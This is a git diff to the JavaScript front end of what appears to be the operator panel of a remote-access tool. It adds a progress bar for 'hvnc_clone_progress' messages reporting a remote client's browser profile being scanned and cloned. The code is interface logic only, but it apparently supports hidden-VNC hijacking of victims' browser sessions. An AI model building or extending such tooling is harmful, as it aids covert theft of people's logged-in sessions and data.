@@ -206,6 +206,51 @@ import { encodeMsgpack, decodeMsgpack } from "./msgpack-helpers.js";
     }
   }
 
+  const cloneProgressEl = document.getElementById("cloneProgress");
+  const cloneProgressBar = document.getElementById("cloneProgressBar");
+  const cloneProgressPct = document.getElementById("cloneProgressPct");
+  const cloneProgressLabel = document.getElementById("cloneProgressLabel");
+  let cloneHideTimer = null;
+
+  function handleCloneProgress(msg) {
+    if (!cloneProgressEl) return;
+    const pct = Math.min(100, Math.max(0, Number(msg.percent) || 0));
+    const status = msg.status || "";
+    const browser = msg.browser || "";
+    const totalMB = ((Number(msg.totalBytes) || 0) / (1024 * 1024)).toFixed(1);
+    const copiedMB = ((Number(msg.copiedBytes) || 0) / (1024 * 1024)).toFixed(1);
+
+    if (cloneHideTimer) {
+      clearTimeout(cloneHideTimer);
+      cloneHideTimer = null;
+    }
+
+    if (status === "done") {
+      cloneProgressBar.style.width = "100%";
+      cloneProgressPct.textContent = "100%";
+      cloneProgressLabel.textContent = `${browser} clone complete`;
+      cloneHideTimer = setTimeout(() => {
+        cloneProgressEl.classList.add("hidden");
+        cloneProgressEl.classList.remove("flex");
+      }, 3000);
+      return;
+    }
+
+    cloneProgressEl.classList.remove("hidden");
+    cloneProgressEl.classList.add("flex");
+
+    if (status === "scanning") {
+      cloneProgressBar.style.width = "0%";
+      cloneProgressPct.textContent = "…";
+      cloneProgressLabel.textContent = `Scanning ${browser} profile`;
+      return;
+    }
+
+    cloneProgressBar.style.width = `${pct}%`;
+    cloneProgressPct.textContent = `${pct}%`;
+    cloneProgressLabel.textContent = `Cloning ${browser} — ${copiedMB} / ${totalMB} MB`;
+  }
+
   function sendCmd(type, payload) {
     if (!activeClientId) {
       console.warn("No active client selected");
@@ -542,12 +587,20 @@ import { encodeMsgpack, decodeMsgpack } from "./msgpack-helpers.js";
         handleStatus(msg);
         return;
       }
+      if (msg && msg.type === "hvnc_clone_progress") {
+        handleCloneProgress(msg);
+        return;
+      }
       return;
     }
 
     const msg = decodeMsgpack(ev.data);
     if (msg && msg.type === "status" && msg.status) {
       handleStatus(msg);
+      return;
+    }
+    if (msg && msg.type === "hvnc_clone_progress") {
+      handleCloneProgress(msg);
       return;
     }
   });
